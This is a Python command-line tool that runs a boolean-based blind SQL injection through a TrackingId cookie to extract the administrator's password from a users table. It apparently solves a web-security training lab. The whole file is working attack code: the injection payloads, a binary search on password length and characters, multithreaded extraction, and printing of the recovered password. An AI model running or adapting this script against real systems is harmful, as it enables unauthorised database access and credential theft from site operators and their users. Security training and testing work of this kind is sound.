import time
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

"""
Blind SQL Injection - Conditional Responses (Optimized)
========================================================
Extracts a password using boolean-based blind SQLi with two optimizations:
  1. Binary search on ASCII values — reduces requests per character from O(n) to O(log n).
  2. ThreadPoolExecutor — extracts all character positions in parallel.

Both the password length and each character position are resolved via binary search.
"""

LOW_ASCII  = 32
HIGH_ASCII = 126
MAX_LENGTH = 50


def find_password_length(session: requests.Session, url: str, tracking_id: str) -> int:
    low, high = 1, MAX_LENGTH

    while low <= high:
        mid = (low + high) // 2
        payload = (
            f"{tracking_id}' AND LENGTH((SELECT password FROM users "
            f"WHERE username='administrator')) > {mid}-- "
        )
        session.cookies.set("TrackingId", payload)
        response = session.get(url)

        if "welcome back" in response.text.lower():
            low = mid + 1
        else:
            high = mid - 1

    return low


def binary_search_char(session: requests.Session, url: str, position: int, tracking_id: str) -> str:
    low, high = LOW_ASCII, HIGH_ASCII

    while low <= high:
        mid = (low + high) // 2
        payload = (
            f"{tracking_id}' AND ASCII((SELECT SUBSTRING(password,{position},1) "
            f"FROM users WHERE username='administrator')) > {mid}-- "
        )
        session.cookies.set("TrackingId", payload)
        response = session.get(url)

        if "welcome back" in response.text.lower():
            low = mid + 1
        else:
            high = mid - 1

    return chr(low)


def extract_password(url: str, threads: int) -> None:
    session = requests.Session()
    session.get(url)
    tracking_id = session.cookies.get("TrackingId")
    if not tracking_id:
        print("[!] TrackingId cookie not found. Verify the target URL.")
        exit(1)

    start_time = time.time()
    length = find_password_length(session, url, tracking_id)
    password = [""] * length

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(binary_search_char, session, url, i, tracking_id)
            for i in range(1, length + 1)
        ]
        with tqdm(total=length, desc="Extracting password") as pbar:
            for i, future in enumerate(futures):
                password[i] = future.result()
                pbar.update(1)

    print(f"[✔] Password length : {length}")
    print(f"[✔] Time taken      : {time.time() - start_time:.2f}s")
    print(f"[✔] Password found  : {''.join(password)}")


parser = argparse.ArgumentParser(description="Blind SQLi password extractor — optimized")
parser.add_argument("-u", "--url", required=True, help="Target URL")
parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads (default: 5)")
args = parser.parse_args()

extract_password(args.url, args.threads)